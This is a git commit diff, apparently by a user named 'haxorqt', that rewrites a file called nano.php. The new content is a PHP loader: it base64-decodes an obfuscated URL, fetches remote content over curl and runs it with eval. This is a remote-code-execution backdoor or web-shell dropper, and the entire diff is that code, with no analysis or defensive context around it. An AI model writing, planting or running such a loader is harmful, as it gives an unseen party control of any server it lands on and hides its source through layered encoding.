08901b612ed265807e861c16910805b7593ae750
haxorqt <83970696+GanestSeven@users.noreply.github.com>
2024-11-11 18:05:21 +0700

    Update nano.php

--- nano.php
+++ nano.php
@@ -1,1 +1,16 @@
-sd
+<?pHp 
+   function get($url) { 
+    $ch = curl_init(); 
+ 
+    curl_setopt($ch, CURLOPT_HEADER, 0); 
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+    curl_setopt($ch, CURLOPT_URL, $url); 
+ 
+    $data = curl_exec($ch); 
+    curl_close($ch); 
+ 
+    return $data; 
+} 
+$x= '?>'; 
+      eval($x . get(base64_decode('VjFaV2IxVXdNVWhVYTJ4VlZrWndUbHBXVW5OT1ZtUlhZVWR3YTFadE9UVlphMUpEWVVaT1IxZHVRbUZTYldoUVdXdGtUMlJHVW5WWGJXeHBZa1Z3ZWxkWE1ERlZiVkpYWVROc1VGZEdTazVVVldSVFlqRnNkRTFXWkd4aVZrcElWa2N4TkdFeVNsZFhha1pWVWtWd1RGbFZXbkpsVjFKSVpFZHNUbUZ0ZHpGV1JWcHFaVWRPU0ZOdVVtaE5NWEJ4V1d4YVlXUkdhM3BoZWxacFRWaENXVlZ0TVRCaGJWWlZZa1JDV0ZadFVucGFSbFkwVG14S1dWWnRjRk5OYldkNg=='))); 
+?>
